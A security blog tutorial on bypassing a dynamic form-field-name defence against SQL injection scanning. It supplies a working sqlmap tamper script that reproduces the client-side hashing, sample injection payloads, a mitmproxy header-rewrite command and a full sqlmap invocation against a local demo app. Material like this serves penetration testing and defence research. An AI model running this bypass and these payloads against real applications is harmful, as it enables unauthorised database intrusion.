---
layout: post
title: Beat dynamic parameters with SQLMap
---

In the [previous][1] post I have written about a simple method of deterring automated tools like `sqlmap` from being run against your application. I have argued that having some client-side JavaScript code that dynamically mangles form fields' _name_ attribute can help a lot (prevent automated calls to DB via your app) when it comes to SQL-injection discovery (provided that the attacker is not-so-determined). Now let's take another side - one of an attacker - and try to circumvent that protection.

First of all, one has to determine what is actually being sent to the server in the end. In the [example][2] from the aforementioned [post][1] we have simulated a very simple mechanism implemented at the client side:

<pre class="javascript">
function submitForm()
        {
            var u = document.getElementById('username');
            var p = document.getElementById('password');
            var ts = (new Date()).getTime().toString().substr(0, 10);
            var hash = CryptoJS.SHA1(ts).toString();

            u.name = 'username' + hash.substr(0, 20);
            p.name = 'password' + hash.substr(20);
        }
</pre>

By looking at the code snippet above we can infer that the `username` field becomes something like `username6d96270004515a0486bb` and `password` turns into `password7f76196a72b40c55a47f`. Of course, these are trivial examples and one can always write some crazy _Tour de France_ like code, then obfuscate it, etc. and that would probably earn her some <strike>street</strike>coding cred.

As we now know that we need to obtain the current UNIX timestamp, SHA-hash it and then append the first 20 bytes to the username field name and the rest to the password field name, we can try using that knowledge to automate enumeration (sqli scanning) process.

Let's turn to `sqlmap` again and recall that it provides a nifty `--tamper` option which selects a _tamper script_ from sqlmap's [`./tamper`][3] directory to be used with each request. FYI, _tamper scripts_ are those that extend sqlmap's functionality by modifying payloads (read injection strings) on the fly on **each** request. [RTFM][4] for more information on those.

Essentially, tamper script is a Python program that looks like this when bare:

<pre class="python">
#!/usr/bin/env python

def tamper(payload, **kwargs):
        return payload
</pre>

Where `payload` is the actual data that is sent to the server after the parameter name under attack and `kwargs` is a pointer to a list with other request data (currently holds just the headers list changing which has no effect at the time of writing this post). We'll need just the `payload` parameter. In the example above the payload is unmodified.

Now that we have this functionality at our disposal, let's create our own tamper script with the following contents:

<pre class="python">
#!/usr/bin/env python

from lib.core.enums import PRIORITY
from time import time
from hashlib import sha1

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):

    if payload:
        ts = str(time())[0:10]
        tsHash = sha1(ts).hexdigest()
        uHash = tsHash[:20]
        pHash = tsHash[20:]

        username = 'username' + uHash
        password = 'password' + pHash

        payload = ("&%s=%s&%s=" % (username, payload, password))

        return payload

</pre>

Pay no attention to `priority` piece for now. Here we mock the JavaScript behavior from the client script at the top of the post. It is important to mention that tamper scripts do not allow parameter name forging on the fly (makes sense as sqlmap's main program is originally bound to parameters put to the test). However, as (in this case) POST data segment (that's after the headers and a line break) allows for it we can append whatever we wish to the end of the payload and tell sqlmap to test a non-existing parameter like `wtf31337lolz`.

In other words, our tamper script will produce the following POST data (without URL encoding for readability):

<pre class="plaintext">
wtf31337lolz=&usernamee7ac6c7decb30ff4e351=bIvB AND 2285=7397&password86584b39cfafc75df10b=
</pre>

Which is supposed to be:

<pre class="plaintext">
wtf31337lolz=&usernamee7ac6c7decb30ff4e351%3dbIvB+AND+2285%3d7397&password86584b39cfafc75df10b=
</pre>

But in reality (whatever that means), sqlmap would logically URL-encode all of it and destroy our payload which we want to be part of POST data:

<pre class="plaintext">
wtf31337lolz=%26usernamee7ac6c7decb30ff4e351%3DbIvB%20AND%202285%3D7397%26password86584b39cfafc75df10b%3D
</pre>

Let's then pass the `--skip-urlencode` option to sqlmap to avoid that. Now that's what doctor ordered:

<pre class="plaintext">
wtf31337lolz=&usernameddb2b4e2a165d45044c6=test) AND 3177=3168 AND (9787=9787&password977fe05ed6a9001cec17=
</pre>

As there's no `wtf31337lolz` parameter in the sample web application at the top of the post but username and password fields are still injectable even though they're outside of sqlmap's scope, the tool would successfully determine SQLi in the app under the name of `wtf31337lolz` param though.

Nevertheless, one issue still remains: sqlmap doesn't show any signs of SQLi in our sample app. The reason is that PHP's `$_POST` contains POST data only if `Content-Type` header has value of `application/x-www-form-urlencoded` and what we've done by introducing `--skip-urlencode` has set `Content-Type: text/plain` header instead - hence `$_POST` is empty on the server side.

There's a simple Python proxy I had handy that overwrites the `Content-Type` header and I set it back to `application/x-www-form-urlencoded`. The same can be achieved by [`mitmproxy`][5]:

<pre class="bash">
mitmproxy -p 3128 -z --setheader "/~hq/Content-type/application/x-www-form-urlencoded" -vvv -e
</pre>

`-vvv` is for verbosity and `-e` is for debug console within mitmproxy.

Finally we launch sqlmap via:

<pre class="bash">
./sqlmap.py -u 'http://localhost:8888/dynamic_parameters.php' --data="wtf31337lolz=test" --tamper=dynamicparams --random-agent  --proxy=http://127.0.0.1:3128 --skip-urlencode --dbms=mysql
</pre>

`mitmproxy` rewrites the `Content-Type` header:

![](http://media.tumblr.com/56b3ae85d9c10906506af97481749256/tumblr_inline_msi57nJPwi1qz4rgp.png)

And voila:

![](http://media.tumblr.com/ca9d9cde793faf11c531d2ce17c23fae/tumblr_inline_msi57xxQMY1qz4rgp.png)

To sum up, you have just created a _tamper script_ for _sqlmap_ that mimics client-side code functionality, which helped you circumvent the pseudo-protection technique for web apps that relies on dynamic input parameters.

Read the manual if unsure, post comment(s) if unclear.

[1]: http://breaking.into.systems/read/2013/dynamic-form-parameters-against-sqlmap-kiddies-at-al "My previous post on this topic"

[2]: https://git.io/fAdpl "Sample web application"

[3]: https://github.com/sqlmapproject/sqlmap/tree/master/tamper "List of tamper scripts @ GitHub"

[4]: https://github.com/sqlmapproject/sqlmap/wiki/Usage "SQLMap usage"

[5]: http://mitmproxy.org/ "Nice intercepting proxy written in Python"
